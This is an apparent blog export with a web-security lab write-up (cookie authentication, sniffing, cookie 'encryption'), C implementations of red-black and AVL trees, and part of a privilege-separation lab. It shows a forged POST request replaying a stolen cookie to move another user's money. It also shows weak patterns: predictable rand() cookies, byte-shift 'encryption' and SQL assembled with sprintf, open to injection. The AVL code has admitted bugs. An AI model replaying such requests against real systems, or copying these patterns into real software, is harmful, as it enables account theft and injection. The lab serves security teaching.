use browser.c or some tools, such as firebug to construct the request. Your request may look like this: We can construct a HTTP POST request like this : 123char *req ="POST / HTTP/1.1\r\nContent-Length: 74\r\n\r\n" "submit=Transfer&amp;transfer_from=abc&amp;transfer_to=LiuChang&amp;" "transfer_money=100\r\n\r\n"; Exercise 5 : Locate the code which handles the post request in handle.c, and add more code. You may find the response header Set-cookie: value useful. When one user transfers money, you should identify the user by cookie. I am sorry about that I change a lot in this codes and ignore some design principles… First of all, we should put forward such a problem about how to generate and save cookies ? In my way, I use a very large random integer as a cookie which can identify the unique user, may be repeated in very little probability, but who care. obtaining accurate values correspond to its user by guessing is impossible. I also add a filed named favorite number, it will describe clearly in Exercise 7, together they formed the cookie, like this : 1username=random_number:favorite_number=user&apos;s input Secondly, the server saves and obtains this value by reading cookie.txt file. When a new user registered, we will generate a cookie for it and save its other information into cookie.txt file as well. After registered, the server should response a HTTP headers likes this : 12345678910char * cookieFileOk = "HTTP/1.1 200 OK\r\nSet-Cookie: ";int cookie = lookup_cookie( name );int favorite_number = Db_getFavoriteNumber( name );char send_cookie[128];char info[512];memset( send_cookie, 0, 128 );memset( info, 0, 512 );sprintf( send_cookie, "%s=%d:%s=%d", name, cookie, "Favorite_number", favorite_number );sprintf( info, "%s%s\r\n\r\n", cookieFileOk, send_cookie );write( fd, info, strlen(info) ); I use HttpFox to capture these POST headers, just like this : Finally, when user wants to transfer money to others, it must provide its passport : cookie. If a attack doesn’t know the cookie exactly and just constructs a HTTP request likes Exercise 4, failure is no doubt. I will attach my codes to illustrate it more clearly. 12345678910111213141516171819202122#if 1if( Db_checkUser( to ) &lt;= 0 ) &#123; illegalInput( fd, "the transfer receiver does not exist !!!" ); return ;&#125;if( m &lt;= 0 ) &#123; illegalInput( fd , "illegal transfer account ! transfer money must be bigger than 0 !"); return ;&#125;if( m &gt; Db_readBalance(from) ) &#123; illegalInput( fd, "illegal transfer account ! transfer money must be less than your account !"); return ;&#125;if( strcmp( from, to ) == 0 ) &#123; illegalInput( fd, "sender is the same as the reciever !" ); return ;&#125;if( strcmp( cookie_value, real_cookie ) != 0 ) &#123; illegalInput( fd, "identify the cookie error! You are a bad guy..." ); return ;&#125; #endif An important to note: this cookie_value is parsed from the HTTP body in parseHeaders function, and was passed from Parse_parse to Handle_main, finally passed to handlePost function. It is a little awkward. Part B：Packet Sniffing Exercise 6 : Using the Wireshark to steal the cookie, and then use the cookie to make fake POST request. Send the request to the server and transfer some one else’s money. My account’s username is LiuChang. I use HttpFox to capture the cookie and construct a HTTP POST request to steal Alice account’s money. I will illustrate it in some pictures. 12345char *req2 =&quot;POST / HTTP/1.1\r\nContent-Length: 75\r\nCookie: Alice=876960:Favorite_number=123\r\n\r\n&quot; &quot;submit=Transfer&amp;transfer_from=Alice&amp;transfer_to=LiuChang&amp;&quot; &quot;transfer_money=80\r\n\r\n&quot;;write(sock_client,req2,strlen(req2)); Part C：Encryption Encryption is the standard way to protect sensitive information from leaking. Encryption itself does not prevent interception, but denies the message content to the interceptor. In this part of the lab, you will explore how to use encryption to protect the packets. Exercise 7 : Encrypt the cookie. You should modify as least these files: index.html, handle.c, and dbutil.c etc… As we known,Cookie is a small piece of data sent from a website and stored in the user’s web browser while the user is browsing it. It always saves user’s sensitive information and can be obtained by tools easily. In order to protect users’ sensitive information, we should encrypt these cookies. In Exercise : 5, we use HttpFox to capture these Cookies and get user’s information easily. In order to defuse this , we need encrypt these cookies, and separate Login and Register modules. First of all, we should drop old user’s table and re-build this table to add a number field which to save user’s favorite number. It just likes as the number of USB-key. When a new user complete to register , we get its input about favorite number and generate a cookie. And we set this cookie into HTTP headers. 1234567891011121314151617181920 static char *cookieFileOk = "HTTP/1.1 200 OK\r\nSet-Cookie: "; struct Cookie cookie; srand(time(NULL)); int cookie_value = rand() % 1000000 + 99999 ; // generate a random cookie memset( &amp;cookie, 0, sizeof( struct Cookie) ); cookie.value = cookie_value; strcpy( cookie.key, name ); fwrite( &amp;cookie, sizeof( struct Cookie ), 1, fp ); // save it into cookie.txt#if 1 char info[512]; char send_cookie[128]; memset( send_cookie, 0, 128 ); memset( info, 0, 512 ); sprintf( send_cookie, "%s=%d:%s=%d", name, cookie_value, "Favorite_number" , atoi( number ) ); encryption( send_cookie ); sprintf( info, "%s%s\r\n\r\n", cookieFileOk, send_cookie );#endif write(fd, info, strlen(info)); I use a simple algorithm to encrypt cookies…But the result is not bad. 12345678static char * encryption( char * s ) &#123; char *p = s; while( *p != '\0' ) &#123; *p = *p + 0x10; p++; &#125; return s;&#125; When users want to transfer money to others, he must provide his favorite number(just likes USB-key) The Login and Register modules are changed a little, but it does not make a difference…]]></content>
      <tags>
        <tag>系统安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Red Black Tree]]></title>
    <url>%2F2015%2F12%2F10%2FRed-Black-Tree%2F</url>
    <content type="text"><![CDATA[本文参考算法导论书籍以及一些博客，实现了红黑树的插入删除算法。 简介 红黑树这个算法，以后可能会再次遇到，我就在此记录一下。这个算法使用的C语言实现的。 红黑树的原理讲解 我是通过参考枫叶博主关于对红黑树讲解，以及算法导论这本书大致了解了红黑树的实现细节。具体参见红黑树删除操作。 红黑树的C实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef enum Color&#123; RED = 0, BLACK = 1&#125;Color;typedef struct Node&#123; int value; Color color; struct Node * parent; struct Node * left; struct Node * right;&#125;Node, *Tree;Node * nil = NULL; // is a leaf nodechar color[2][6] = &#123; &#123;"RED"&#125;, &#123;"BLACK"&#125; &#125; ;void left_rotate( Tree * T, Node * x ) // x's right subtree will be x's new parent&#123; if( x-&gt;right != nil ) &#123; Node * y = x-&gt;right; x-&gt;right = y-&gt;left; if( y-&gt;left != nil ) // is not a leaf &#123; y-&gt;left-&gt;parent = x; &#125; y-&gt;parent = x-&gt;parent; if( x-&gt;parent == nil ) // x is root &#123; *T = y; &#125; else &#123; if( x == x-&gt;parent-&gt;left ) &#123; x-&gt;parent-&gt;left = y; &#125; else &#123; x-&gt;parent-&gt;right = y; &#125; &#125; y-&gt;left = x; x-&gt;parent = y; &#125; else &#123; printf("can not execute left rotate: right child is nil !\n"); &#125;&#125;void right_rotate( Tree * T, Node * x ) // x's left subtree will be x's new parent&#123; if( x-&gt;left != nil ) &#123; Node * y = x-&gt;left; x-&gt;left = y-&gt;right; if( y-&gt;right != nil ) &#123; y-&gt;right-&gt;parent = x; &#125; y-&gt;parent = x-&gt;parent; if( x-&gt;parent == nil ) &#123; *T = y; &#125; else &#123; if( x == x-&gt;parent-&gt;left ) &#123; x-&gt;parent-&gt;left = y; &#125; else &#123; x-&gt;parent-&gt;right = y; &#125; &#125; y-&gt;right = x; x-&gt;parent = y; &#125; else &#123; printf("can not execute right rotate : left child is nil !\n"); &#125;&#125;void insert_fix_up( Tree * T, Node * z )&#123; Node * y; while( z-&gt;parent-&gt;color == RED ) &#123; if( z-&gt;parent-&gt;parent-&gt;left == z-&gt;parent ) // z's parent is a left subtree &#123; y = z-&gt;parent-&gt;parent-&gt;right; if( y-&gt;color == RED ) // case 1 &#123; y-&gt;color = BLACK; z-&gt;parent-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; z = z-&gt;parent-&gt;parent; &#125; else if( z == z-&gt;parent-&gt;right ) // case 2 &#123; z = z-&gt;parent; left_rotate( T, z ); &#125; else // case 3 &#123; z-&gt;parent-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; right_rotate( T, z-&gt;parent-&gt;parent ); &#125; &#125; else &#123; y = z-&gt;parent-&gt;parent-&gt;left; if( y-&gt;color == RED ) // case 1 &#123; y-&gt;color = BLACK; z-&gt;parent-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; z = z-&gt;parent-&gt;parent; &#125; else if( z == z-&gt;parent-&gt;left ) // case 2 &#123; z = z-&gt;parent; right_rotate( T, z ); &#125; else // case 3 &#123; z-&gt;parent-&gt;color = BLACK; z-&gt;parent-&gt;parent-&gt;color = RED; left_rotate( T, z-&gt;parent-&gt;parent ); &#125; &#125; &#125; (*T)-&gt;color = BLACK;&#125;void insert_node( Tree * T, int value )&#123; if( (*T) == NULL ) // &#123; (*T) = ( Tree )malloc( sizeof(Node) ); nil = (Node *)malloc( sizeof(Node) ); nil-&gt;color = BLACK; // nil init NULL as a globle var ... (*T)-&gt;left = nil; (*T)-&gt;right = nil; (*T)-&gt;parent = nil; (*T)-&gt;value = value; (*T)-&gt;color = BLACK; &#125; else &#123; Node * x = *T; Node * parent = nil; // save x's parent while( x != nil ) &#123; parent = x; if( value &lt; x-&gt;value ) &#123; x = x-&gt;left; &#125; else if( value &gt; x-&gt;value ) &#123; x = x-&gt;right; &#125; else &#123; printf("value = %d node has existed !\n", value ); return ; &#125; &#125; x = ( Node * )malloc(sizeof(Node)); x-&gt;color = RED; x-&gt;left = nil; x-&gt;right = nil; x-&gt;parent = parent; x-&gt;value = value; if( value &lt; parent-&gt;value ) &#123; parent-&gt;left = x; &#125; else &#123; parent-&gt;right = x; &#125; insert_fix_up( T, x ); &#125;&#125;void delete_fix_up( Tree * T, Node * x )&#123; while( x != *T &amp;&amp; x-&gt;color == BLACK ) // only fix up black node &#123; if( x == x-&gt;parent-&gt;left ) &#123; Node * w = x-&gt;parent-&gt;right; if( w-&gt;color == RED ) // case 1 &#123; w-&gt;color = BLACK; x-&gt;parent-&gt;color = RED; left_rotate( T, x-&gt;parent ); w = x-&gt;parent-&gt;right; &#125; if( w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK ) // case 2 &#123; w-&gt;color = RED; x = x-&gt;parent; &#125; else if( w-&gt;right-&gt;color == BLACK ) // case 3 &#123; w-&gt;left-&gt;color = BLACK; w-&gt;color = RED; right_rotate( T, w ); w = x-&gt;parent-&gt;right; &#125; else // case4 &#123; w-&gt;color = x-&gt;parent-&gt;color; x-&gt;parent-&gt;color = BLACK; w-&gt;right-&gt;color = BLACK; left_rotate( T, x-&gt;parent ); x = *T; &#125; &#125; else &#123; Node * w = x-&gt;parent-&gt;left; if( w-&gt;color == RED ) // case 1 &#123; w-&gt;color = BLACK; x-&gt;parent-&gt;color = RED; right_rotate( T, x-&gt;parent ); w = x-&gt;parent-&gt;left; &#125; if( w-&gt;left-&gt;color == BLACK &amp;&amp; w-&gt;right-&gt;color == BLACK ) // case 2 &#123; w-&gt;color = RED; x = x-&gt;parent; &#125; else if( w-&gt;left-&gt;color == BLACK ) // case 3 &#123; w-&gt;right-&gt;color = BLACK; w-&gt;color = RED; left_rotate( T, w ); w = x-&gt;parent-&gt;left; &#125; else // case4 &#123; w-&gt;color = x-&gt;parent-&gt;color; x-&gt;parent-&gt;color = BLACK; w-&gt;left-&gt;color = BLACK; right_rotate( T, x-&gt;parent ); x = *T; &#125; &#125; &#125; x-&gt;color = BLACK;&#125;Node * get_node( Tree T, int value )&#123; while( T != NULL &amp;&amp; T != nil ) &#123; if( value == T-&gt;value ) return T; if( value &gt; T-&gt;value ) &#123; T = T-&gt;right; &#125; else &#123; T = T-&gt;left; &#125; &#125; printf("Not find this node &lt; value : %d &gt;\n", value ); return NULL;&#125;Node * successor( Tree T, Node * x )&#123; if( x-&gt;right != nil ) // find the successor from the right subtree &#123; Node * q = x-&gt;right; Node * p = x-&gt;right; while( p-&gt;left != nil ) &#123; q = p-&gt;left; p = p-&gt;left; &#125; return q; &#125; else &#123; Node * parent = x-&gt;parent; while( parent != nil &amp;&amp; x-&gt;value &gt; parent-&gt;value ) &#123; x = x-&gt;parent; parent = parent-&gt;parent; &#125; return parent; &#125;&#125;void delete_node( Tree * T, Node * z )&#123; Node * y; // we delete this node Node * x; // the child of deleted node if( z-&gt;left == nil || z-&gt;right == nil ) &#123; y = z; &#125; else &#123; y = successor( *T, z ); // y don't have right child &#125; if( y-&gt;left != nil ) &#123; x = y-&gt;left; &#125; else &#123; x = y-&gt;right; &#125; x-&gt;parent = y-&gt;parent; if( y-&gt;parent == nil ) &#123; *T = x; &#125; else &#123; if( y == y-&gt;parent-&gt;left ) &#123; y-&gt;parent-&gt;left = x; &#125; else &#123; y-&gt;parent-&gt;right = x; &#125; &#125; if( y != z ) &#123; z-&gt;value = y-&gt;value; &#125; if( y-&gt;color == BLACK ) delete_fix_up( T, x ); free( y );&#125;void mid_traversal( Tree T ) &#123; if( T != NULL &amp;&amp; T != nil ) &#123; mid_traversal( T-&gt;left ); printf("value: %d color: %s\n", T-&gt;value, color[T-&gt;color] ); mid_traversal( T-&gt;right ); &#125;&#125;int main() &#123; Tree t = NULL; insert_node( &amp;t, 41 ); insert_node( &amp;t, 38 ); insert_node( &amp;t, 31 ); insert_node( &amp;t, 12 ); insert_node( &amp;t, 19 ); insert_node( &amp;t, 8 ); printf("\n-------------orignal tree ------------\n"); mid_traversal( t ); printf("\n-------delete value = 8 node----------\n"); delete_node( &amp;t, get_node( t, 8 ) ); mid_traversal( t ); printf("\n-------delete value = 12 node----------\n"); delete_node( &amp;t, get_node( t, 12 ) ); mid_traversal( t ); printf("\n-------delete value = 19 node----------\n"); delete_node( &amp;t, get_node( t, 19 ) ); mid_traversal( t ); printf("\n-------delete value = 31 node----------\n"); delete_node( &amp;t, get_node( t, 31 ) ); mid_traversal( t ); printf("\n-------delete value = 38 node----------\n"); delete_node( &amp;t, get_node( t, 38 ) ); mid_traversal( t ); printf("\n-------delete value = 41 node----------\n"); delete_node( &amp;t, get_node( t, 41 ) ); mid_traversal( t ); return 0;&#125; 运行效果 最后 这个算法写的比较仓促，没有考虑优化方面的事情。这个算法是参考这位博主,虽然他写的中有一些错误，但给我提供许多思路。再次感谢以上两位博主。]]></content>
      <tags>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[平衡二叉树]]></title>
    <url>%2F2015%2F12%2F09%2F%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%2F</url>
    <content type="text"><![CDATA[本文简要的实现了平衡二叉树的插入、删除操作。为了更新节点的平衡度，新增了parent指针。 简介 这个平衡二叉树使用C语言实现的，因为写的匆忙，加上智商捉急，可能某些地方没有考虑周全，会有一点小bug，尚在排查中。本算法能基本的实现平衡二叉树的插入、删除操作，有关平衡二叉树的原理及实现，参考AVL树(一)之 图文解析 和 C语言的实现。这位博主讲解的非常详细！！虽然他给的代码中有一些错误，但从他的博文中，我受益良多，并且重写了这个AVL树，在此表示感谢 _ . 数据结构 这里的parent指针很重要，它可以在平衡二叉树删除算法的调整过程中，起着很大的作用。有一点需要注明的是，那位博主的删除算法有误，选用的数据结构也不太合理。。 123456789typedef int DataType;typedef struct Node &#123; DataType value; int depth; // 保存节点在树中的深度，没有孩子，深度为1，负责深度为左右孩子最大深度值加1 struct Node * left; struct Node * right; struct Node * parent;&#125; Node, *Tree; 基本思想 插入过程 我就不想说了，无非LL、LR、RL、RR型的旋转操作。想在这里记录一下： 删除算法的过程 1、若该节点有左右孩子 那么就用它的后继孩子节点替换该节点。假如本来删除的节点为node,它的左右孩子均非空，这时就用它的后继节点successor作为要删除的节点，即将successor节点的值赋给node，再删掉successor节点，因为这样需要调整的节点会少。 2、若该节点只有1个或0个孩子 直接删掉它。 关于调整过程： 对删除节点的父节点开始调整，更新其depth，并且向根节点开始迭代。计算每个父节点的左右子树的平衡差diff_depth，若为2则启动调整算法。 调整算法 基于四个调整操作，即LL、LR、RL、RR旋转。具体怎么旋转，参见那篇博文，灰常详细。 平衡二叉树C实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef int DataType;typedef struct Node &#123; DataType value; int depth; // the position in this tree struct Node * left; struct Node * right; struct Node * parent;&#125; Node, *Tree;int get_depth(Node * node) &#123; if(node == NULL) &#123; return 0; &#125; else if(node-&gt;left == NULL &amp;&amp; node -&gt;right == NULL) &#123; return 1; &#125; else if(node-&gt;left == NULL &amp;&amp; node-&gt;right != NULL) &#123; return (node-&gt;right-&gt;depth + 1); &#125; else if(node-&gt;left != NULL &amp;&amp; node -&gt;right == NULL) &#123; return ( node-&gt;left-&gt;depth + 1 ); &#125; else &#123; return (max( node-&gt;left-&gt;depth, node-&gt;right-&gt;depth ) + 1) ; &#125;&#125;int diff_depth( Tree T ) &#123; if(T-&gt;left == NULL &amp;&amp; T-&gt;right != NULL) &#123; return T-&gt;right-&gt;depth; &#125; else if(T-&gt;left != NULL &amp;&amp; T-&gt;right == NULL) &#123; return T-&gt;left-&gt;depth; &#125; else if(T-&gt;left == NULL &amp;&amp; T-&gt;right == NULL) &#123; return 0; &#125; else &#123; if(T-&gt;left-&gt;depth &gt; T-&gt;right-&gt;depth) &#123; return T-&gt;left-&gt;depth - T-&gt;right-&gt; depth; &#125; else &#123; return T-&gt;right-&gt;depth - T-&gt;left-&gt;depth; &#125; &#125;&#125;int max(int a, int b) &#123; return a &gt; b ? a:b;&#125;Node * get_node(Tree T, DataType value) &#123; while(T != NULL) &#123; if(value == T-&gt;value) &#123; return T; &#125; if(value &gt; T-&gt;value) &#123; T = T-&gt;right; &#125; else &#123; T = T-&gt;left; &#125; &#125; printf("get_node : not find this node &lt; value : %d &gt;\n", value ); return NULL;&#125;Node * get_successor(Tree T, Node * x) &#123; if(x-&gt;right != NULL) &#123; Node * p = x-&gt;right; while ( p-&gt;left != NULL ) &#123; p = p-&gt;left; &#125; return p; &#125; else &#123; Node * parent = x-&gt;parent; while ( parent != NULL &amp;&amp; x-&gt;value &gt; parent-&gt;value ) &#123; parent = parent-&gt;parent; &#125; return parent; &#125;&#125;Tree left_left_rotate(Tree T) &#123; Node * node; node = T-&gt;left; node-&gt;parent = T-&gt;parent; T-&gt;left = node-&gt;right; T-&gt;parent = node; node-&gt;right = T; T-&gt;depth = get_depth( T ); node-&gt;depth = get_depth( node ); return node; // new root node&#125;Tree right_right_rotate(Tree T) &#123; Node * node; node = T-&gt;right; node-&gt;parent = T-&gt;parent; T-&gt;right = node-&gt;left; T-&gt;parent = node; node-&gt;left = T; T-&gt;depth = get_depth( T ); node-&gt;depth = get_depth( node ); return node; // new root node&#125;Tree left_right_rotate(Tree T) &#123; T-&gt;left = right_right_rotate( T-&gt;left ); return left_left_rotate( T );&#125;Tree right_left_rotate(Tree T) &#123; T-&gt;right = left_left_rotate( T-&gt;right ); return right_right_rotate( T );&#125;Tree insert_fix_up(Node * node) &#123; Node * father = node-&gt;parent; Node * temp_node = NULL; Node * root = NULL; if (father == NULL) return node ; if (father-&gt;parent == NULL) return father; while (father-&gt;parent != NULL) &#123; if (diff_depth( father-&gt;parent ) == 2) &#123; temp_node = father-&gt;parent-&gt;parent; if(father == father-&gt;parent-&gt;left) &#123; if (node == node-&gt;parent-&gt;left) &#123; if ( temp_node == NULL ) left_left_rotate( father-&gt;parent ); else temp_node-&gt;left = left_left_rotate( father-&gt;parent ); // LL 调整 &#125; else &#123; if ( temp_node == NULL ) left_right_rotate( father-&gt;parent ); else temp_node-&gt;left = left_right_rotate( father-&gt;parent ); // LR 调整 &#125; &#125; else &#123; // 在右子树中调整 if ( node == node-&gt;parent-&gt;left ) &#123; if ( temp_node == NULL ) right_left_rotate( father-&gt;parent ); temp_node-&gt;right = right_left_rotate( father-&gt;parent ); // RL 调整 &#125; else &#123; if ( temp_node == NULL ) right_right_rotate( father-&gt;parent ); else temp_node-&gt;right = right_right_rotate( father-&gt;parent ); // RR 调整 &#125; &#125; break; &#125; father = father-&gt;parent; node = node-&gt;parent; &#125; while ( temp_node != NULL ) &#123; // 更新调整后的深度 temp_node-&gt;depth = get_depth( temp_node ); temp_node = temp_node-&gt;parent; &#125; root = node ; // 从新插入的节点往上找root节点 while( root-&gt;parent != NULL ) root = root-&gt;parent; return root ;&#125;Tree insert_node( Tree * T, DataType value )&#123; Node * parent = *T ; Node * node = NULL ; if( *T == NULL ) &#123; *T = ( Tree )malloc( sizeof( Node ) ); if( *T == NULL ) &#123; printf(" insert_node : error to create a node &lt; value : %d &gt;\n", value ); return *T ; &#125; (*T)-&gt;left = NULL; (*T)-&gt;right = NULL; (*T)-&gt;depth = 1; (*T)-&gt;parent = NULL; (*T)-&gt;value = value; return *T ; &#125; while( *T != NULL ) &#123; parent = *T; // 得到要插入节点的父节点位置 if ( value &gt; (*T)-&gt;value ) *T = (*T)-&gt;right; else if ( value &lt; (*T)-&gt;value ) *T = (*T)-&gt;left; else &#123; printf(" this Node: &lt; value = %d &gt; has existed!\n ", value ); return *T ; &#125; &#125; node = ( Node * )malloc( sizeof( Node ) ); if( node == NULL ) &#123; printf(" insert_node : error to create a node &lt; value : %d &gt;\n", value ); return *T ; &#125; if ( value &gt; parent-&gt;value ) &#123; parent-&gt;right = node; &#125; else &#123; parent-&gt;left = node; &#125; node-&gt;left = NULL; node-&gt;right = NULL; node-&gt;parent = parent; node-&gt;depth = 1; node-&gt;value = value; while( parent != NULL ) &#123; parent-&gt;depth = get_depth( parent ); parent = parent-&gt;parent; &#125; *T = insert_fix_up( node ); return *T ;&#125;Tree delete_fix_up( Node * node )&#123; Node * child = NULL; if ( node-&gt;left != NULL ) &#123; child = node-&gt;left; if ( child-&gt;left != NULL ) // LL型调整 &#123; return left_left_rotate( node ); &#125; else // LR型调整 &#123; return left_right_rotate( node ); &#125; &#125; else &#123; child = node-&gt;right; if ( child-&gt;left != NULL ) // RL型调整 &#123; return right_left_rotate( node ); &#125; else // RR型调整 &#123; return right_right_rotate( node ); &#125; &#125;&#125;Tree delete_node( Tree * T, DataType value )&#123; Node * node = NULL; Node * delete_node = NULL; Node * father = NULL; if ( *T == NULL ) &#123; printf("Tree is NULL !!\n"); return NULL; &#125; node = get_node( *T, value ); if ( node-&gt;left != NULL &amp;&amp; node-&gt;right != NULL ) &#123; delete_node = get_successor( *T, node ); // 用被删的后继节点取代要删的节点 node-&gt;value = delete_node-&gt;value; if ( delete_node-&gt;parent == node ) //后继节点就是它的右孩子，因为它的右子树没有左孩子 &#123; if ( delete_node-&gt;right != NULL ) &#123; node-&gt;right = delete_node-&gt;right; delete_node-&gt;right-&gt;parent = node; &#125; else &#123; node-&gt;right = NULL; &#125; //node-&gt;depth = get_depth( node ); &#125; else // 右子树有左孩子,一定是叶子节点，直接删掉 &#123; delete_node-&gt;parent-&gt;left = NULL; &#125; &#125; else // 要删除的节点只要一个字节点，或者没有字节点的情况 &#123; delete_node = node; father = delete_node-&gt;parent; if ( father != NULL ) &#123; if ( father-&gt;left == delete_node ) // 在父节点的左子树上 &#123; if ( delete_node-&gt;left != NULL ) // 被删节点有左孩子 &#123; father-&gt;left = delete_node-&gt;left; delete_node-&gt;left-&gt;parent = father; &#125; else if ( delete_node-&gt;right != NULL ) &#123; father-&gt;left = delete_node-&gt;right; delete_node-&gt;right-&gt;parent = father; &#125; else &#123; father-&gt;left = NULL; &#125; &#125; else // 在父节点的右子树上 &#123; if ( delete_node-&gt;left != NULL ) &#123; father-&gt;right = delete_node-&gt;left; delete_node-&gt;left-&gt;parent = father; &#125; else if ( delete_node-&gt;right != NULL ) &#123; father-&gt;right = delete_node-&gt;right; delete_node-&gt;right-&gt;parent = father; &#125; else &#123; father-&gt;right = NULL; &#125; &#125; &#125; else // delete_node的父节点位NULL，说明此时删除的是根节点，又因为delete_node == node说明此时根节点只有一个子节点 &#123; if ( delete_node-&gt;left != NULL ) &#123; *T = delete_node-&gt;left; &#125; else if ( delete_node-&gt;right != NULL ) &#123; *T = delete_node-&gt;right; &#125; else &#123; *T = NULL; &#125; goto end; &#125; &#125; father = delete_node-&gt;parent; // 从这里开始，需要重新计算深度 while( father != NULL ) &#123; *T = father; father-&gt;depth = get_depth( father ); if ( diff_depth( father ) == 2 ) &#123; Node * temp = father-&gt;parent; if ( temp != NULL ) &#123; if ( temp-&gt;left == father ) &#123; temp-&gt;left = delete_fix_up( father ); &#125; else &#123; temp-&gt;right = delete_fix_up( father ); &#125; father = temp; // 继续向上调整 continue; &#125; else &#123; *T = delete_fix_up( father ); // 已调整到最上层 break; &#125; &#125; father = father-&gt;parent; &#125;end: free( delete_node ); return *T;&#125;void mid_traversal( Tree T )&#123; if( T != NULL ) &#123; mid_traversal( T-&gt;left ); printf(" value : %d , depth : %d \n", T-&gt;value, T-&gt;depth ); mid_traversal( T-&gt;right ); &#125;&#125;int main()&#123; Tree T = NULL; insert_node( &amp;T, 3 ); insert_node( &amp;T, 2 ); insert_node( &amp;T, 1 ); insert_node( &amp;T, 4 ); insert_node( &amp;T, 5 ); insert_node( &amp;T, 6 ); insert_node( &amp;T, 7 ); printf("------------orignal binary tree : --------\n"); mid_traversal( T );#if 1 printf("\n-------delete node &lt; value : %d &gt;\n", 7 ); delete_node( &amp;T, 7 ); mid_traversal( T ); printf("\n-------delete node &lt; value : %d &gt;\n", 6 ); delete_node( &amp;T, 6 ); mid_traversal( T ); printf("\n-------delete node &lt; value : %d &gt;\n", 5 ); delete_node( &amp;T, 5 ); mid_traversal( T ); printf("\n-------delete node &lt; value : %d &gt;\n", 4 ); delete_node( &amp;T, 4 ); mid_traversal( T ); printf("\n-------delete node &lt; value : %d &gt;\n", 3 ); delete_node( &amp;T, 3 ); mid_traversal( T ); printf("\n-------delete node &lt; value : %d &gt;\n", 2 ); delete_node( &amp;T, 2 ); mid_traversal( T );#endif printf("\n------------ over -------------------\n"); return 0;&#125; 运行结果 总结 理论与实践结合真的很重要，从书本上看这些算法没什么难的，自己动手写了一遍却被虐成了狗，同时也深深的敬佩提出这些算法的大牛们，佩服遇到问题时这么巧妙、这么机智的解决。 还有一点是，在于指针打交道的过程中，遇到段错误真是再平常也不过了。GDB真是一个你用了就会爱上它的好东西，解决段错误真是一大利器 _ 。]]></content>
      <tags>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Privilege Separation]]></title>
    <url>%2F2015%2F11%2F21%2FPrivilege-Separation%2F</url>
    <content type="text"><![CDATA[This is a experiment of Information Security, about 7 exercises in this blog. May be a lot mistakes here, if you find it, please contact me. This lab consists of three parts: Lab 3 : Privilege Separation Lab Environment Setup Platform : Ubuntu 12.04 ( 64 bits ) Contents : Privilege Separation Brief introduction This lab consists of three parts: Part A: you will examine the architecture of the Touchstone web server. The Touchstone web server in this lab differs dramatically from those from lab 1 and 2, the current one is based on the idea of services; Part B: you will explore jail, by which you can constraint the service in some fake root directory; and Part C: you will privilege-separate the Touchstone web server by assigning each component appropriate privilege. Part A: The Touchstone Web Server Exercise 1. In order to gain deeper understanding of the internal architecture of the Touchstone web server, let’s use gdb to debug the banksv service.First, launch the server: 1$ sudo ./touchstone now use gdb to attach to the banksv service: Exercise 2. Finally, you will write some code. Extend the current sqlite3 user table, to add more information. For instance, you can add time and IP address to the user table, so that when one user has logged in, the web page can display the last login time, the current login address, etc… You may want to read some sqlite3 documentations. In order to complete these functions, I made effort in two places. One is to pass the value of client_addr, the other is to modify the user’s database. Firstly, we pass the value of client_addr to httpd process though by executing write( disp_fds[1], inet_ntoa(client_addr), 50 ). And in httpd process, as a hub, we receive this value. Then we send this value to filesv and banksv processes respectively according to pipefd descriptor. So that, we can process this address to the browser. Why we don’t send it to filesv and banksv directly ? It is just a pity that the server has shut down these descriptors before new client coming… Secondly, we should add additional fields for the user table. One is the ip_addr, the other is last_time(which can record the last login time). Before modifying user table, we should drop it because some datas has existed in the user table. In order to get and update the last login time and last ip address, two functions need to be implemented. As follows : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152void getLastState(const char * u_name, const char * u_passwd, char * last_ip_addr, char * last_time) &#123; if(open_db()==SUCCESS)&#123; char sql[1024]; sprintf(sql, "SELECT ip_addr, time from user WHERE name = '%s' AND passwd= '%s' ", u_name, u_passwd); int row,column; char **result; char *errorMsg; if( sqlite3_get_table(db, sql, &amp;result, &amp;row, &amp;column, &amp;errorMsg) == SQLITE_OK) &#123; strcpy( last_ip_addr, result[2] ); strcpy( last_time, result[3] ); &#125; else &#123; printf("getLastState error!\n"); &#125; sqlite3_close(db); &#125; else&#123; if(DEBUG) printf("open 